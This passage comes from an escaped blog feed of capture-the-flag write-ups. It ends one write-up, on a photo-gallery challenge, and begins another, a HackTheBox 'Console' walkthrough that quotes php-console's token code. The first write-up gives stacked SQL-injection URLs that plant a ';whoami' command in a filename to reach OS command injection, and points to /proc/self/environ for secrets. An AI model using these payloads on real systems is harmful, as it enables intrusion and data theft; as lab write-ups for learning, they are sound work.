style=&quot;color:#bf616a;&quot;&gt;replace&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;..&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;, &amp;#39;&amp;#39;), &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;rb&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;read&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;__name__ == &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;__main__&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;:
&lt;&#x2F;span&gt;&lt;span&gt;	app.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;run&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;host&lt;&#x2F;span&gt;&lt;span&gt;=&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;0.0.0.0&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;port&lt;&#x2F;span&gt;&lt;span&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;80&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;This part of the code stood out as dangerous:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span&gt;rep += &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;lt;i&amp;gt;Space used: &lt;&#x2F;span&gt;&lt;span&gt;&amp;#39; + subprocess.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;check_output&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;du -ch &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt; || exit 0&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39; % &amp;#39; &amp;#39;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;join&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;files&#x2F;&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39; + fn &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;fn &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;fns), &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;shell&lt;&#x2F;span&gt;&lt;span&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;True&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;stderr&lt;&#x2F;span&gt;&lt;span&gt;=subprocess.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;STDOUT&lt;&#x2F;span&gt;&lt;span&gt;).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;strip&lt;&#x2F;span&gt;&lt;span&gt;().&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rsplit&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;)[-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;] + &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;lt;&#x2F;i&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;The &amp;quot;spaced used&amp;quot; is displayed using &lt;code&gt;du -ch&lt;&#x2F;code&gt; with a supplied user input from &lt;code&gt;%s&lt;&#x2F;code&gt;. This bad coding practice is susceptible to OS command line injection. Even though a part of the code does have an input sanitization function in place, it doesn&#x27;t sanitize for semi-colon which is commonly used for injection type attacks.&lt;&#x2F;p&gt;
&lt;p&gt;To exploit the vulnerability, the &lt;code&gt;id&lt;&#x2F;code&gt; parameter needs to be escaped using a semi-colon to close the SQL statement and inject an &lt;code&gt;update&lt;&#x2F;code&gt; statement.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;sql&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-sql &quot;&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span&gt;http:&#x2F;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;34&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;74&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;105&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;127&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;9c4252a0af&#x2F;fetch?id=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;update&lt;&#x2F;span&gt;&lt;span&gt; photos &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;set&lt;&#x2F;span&gt;&lt;span&gt; filename=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;whoami&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;where&lt;&#x2F;span&gt;&lt;span&gt; id=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;commit
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;h1-photogallery&#x2F;h1-photogallery-3.png&quot; alt=&quot;h1-photogallery-3.png&quot; &#x2F;&gt; &lt;&#x2F;p&gt;
&lt;p&gt;As you can see, the command did execute and parsed on the web page but for some reason the command is showing a try exception. After trial and error, the &lt;code&gt;du -ch %s&lt;&#x2F;code&gt; needs to be escaped as well using semi-colon for the OS command to execute.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;sql&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-sql &quot;&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span&gt;http:&#x2F;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;34&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;74&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;105&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;127&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;9c4252a0af&#x2F;fetch?id=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;update&lt;&#x2F;span&gt;&lt;span&gt; photos &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;set&lt;&#x2F;span&gt;&lt;span&gt; filename=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;;whoami&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;where&lt;&#x2F;span&gt;&lt;span&gt; id=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;commit   
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;In the real world, this evidence is enough to submit a bug bounty report but because this is a CTF so we need to find the second flag. Additional hints reveal something about being aware of the environment. After digging around what this means, the final two flags can be found in &lt;code&gt;&#x2F;proc&#x2F;self&#x2F;environ&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Console</title>
        <published>2020-06-18T00:00:00+00:00</published>
        <updated>2020-06-18T00:00:00+00:00</updated>
        <author>
          <name>John Tuyen</name>
        </author>
        <link rel="alternate" href="https://johntuyen.com/posts/htb-console/" type="text/html"/>
        <id>https://johntuyen.com/posts/htb-console/</id>
        
        <content type="html">&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&amp;quot;Could you please check the console of your Chrome?&amp;quot;&lt;&#x2F;p&gt;
&lt;p&gt;Upon investigating the URL, it showed a php info status page which hinted to load php-console in order to be prompted for a password. At first I didn&#x27;t know what this meant until I read the hints about downloading a chrome extension.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-console&#x2F;htb-console-1.png&quot; alt=&quot;htb-console-1.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-console&#x2F;htb-console-2.png&quot; alt=&quot;htb-console-2.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Prior before knowing about the Chrome extension, I intercepted some HTTP requests to see what it looks like.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-console&#x2F;htb-console-3.png&quot; alt=&quot;htb-console-3.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;As you can see, nothing really interesting is found. Now if you used the PHP-Console extension, you see extra HTTP headers added to the HTTP request.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-console&#x2F;htb-console-4.png&quot; alt=&quot;htb-console-4.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;I noticed how the &lt;code&gt;php-console-client&lt;&#x2F;code&gt; cookie parameter was base64 encoded so I decoded it.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-console&#x2F;htb-console-5.png&quot; alt=&quot;htb-console-5.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;There we go, a token parameter is found. It&#x27;s starting to make some sense now of what I need to do. I thought about two questions, first is how can I generate a token? I know that the Chrome extension accepts a password for login but how would I streamline the process to brute force with a dictionary? The second question is, how is a token created? What data type is it using? Is it encrypted? The only way answer these questions is looking at the source code.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Looking at the source code of PHP-Console application, there is an interesting &lt;code&gt;auth.php&lt;&#x2F;code&gt; file that handles &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;barbushin&#x2F;php-console&#x2F;blob&#x2F;master&#x2F;src&#x2F;PhpConsole&#x2F;Auth.php&quot;&gt;token generation&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;php&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-php &quot;&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span style=&quot;color:#ab7967;&quot;&gt;&amp;lt;?php
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;namespace &lt;&#x2F;span&gt;&lt;span&gt;PhpConsole;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;**
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;* PHP Console client authorization credentials &amp;amp; validation class
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;*
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;@package&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt; PhpConsole
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;@version&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt; 3.1
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;@link &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;http:&#x2F;&#x2F;consle.com
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;@author&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt; Sergey Barbushin http:&#x2F;&#x2F;linkedin.com&#x2F;in&#x2F;barbushin
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;@copyright&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt; © Sergey Barbushin, 2011-2013. All rights reserved.
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;@license &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;http:&#x2F;&#x2F;www.opensource.org&#x2F;licenses&#x2F;BSD-3-Clause &amp;quot;The BSD 3-Clause License&amp;quot;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;@codeCoverageIgnore
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;*&#x2F;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;class &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;Auth &lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;{
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;const &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;PASSWORD_HASH_SALT &lt;&#x2F;span&gt;&lt;span&gt;= &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;NeverChangeIt:)&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;protected &lt;&#x2F;span&gt;&lt;span&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;publicKeyByIp&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;protected &lt;&#x2F;span&gt;&lt;span&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;passwordHash&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;**
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt; * &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;@param&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt; string $password Common password for all clients
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt; * &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;@param&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt; bool $publicKeyByIp Set public key depending on client IP
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt; *&#x2F;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;public function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;__construct&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;password&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;publicKeyByIp &lt;&#x2F;span&gt;&lt;span&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;true&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;) {
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;	&lt;&#x2F;span&gt;&lt;span&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;-&amp;gt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;publicKeyByIp &lt;&#x2F;span&gt;&lt;span&gt;= $&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;publicKeyByIp&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;	&lt;&#x2F;span&gt;&lt;span&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;-&amp;gt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;passwordHash &lt;&#x2F;span&gt;&lt;span&gt;= $&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;-&amp;gt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;getPasswordHash&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;password&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;);
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;}
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;protected &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;final &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;hash&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;string&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;) {
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;hash&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;sha256&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;string&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;);
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;}
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;**
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt; * Get password hash like on client
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt; * &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;@param&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt; $password
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt; * &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;@return&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt; string
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt; *&#x2F;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;protected &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;final &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;getPasswordHash&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;password&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;) {
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;-&amp;gt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;hash&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;password &lt;&#x2F;span&gt;&lt;span&gt;. &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;::&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;PASSWORD_HASH_SALT&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;);
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;}
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&#x2F;**
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt; * Get authorization result data for client
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt; * &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;@codeCoverageIgnore
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt; * &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;@param&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt; ClientAuth|null $clientAuth
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt; * &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;@return&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt; ServerAuthStatus
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt; *&#x2F;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;final &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;getServerAuthStatus&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;ClientAuth &lt;&#x2F;span&gt;&lt;span&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;clientAuth &lt;&#x2F;span&gt;&lt;span&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;null&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;) {
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;	&lt;&#x2F;span&gt;&lt;span&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;serverAuthStatus &lt;&#x2F;span&gt;&lt;span&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;new &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;ServerAuthStatus&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;();
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;	&lt;&#x2F;span&gt;&lt;span&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;serverAuthStatus&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;-&amp;gt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;publicKey &lt;&#x2F;span&gt;&lt;span&gt;= $&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;-&amp;gt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;getPublicKey&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;();
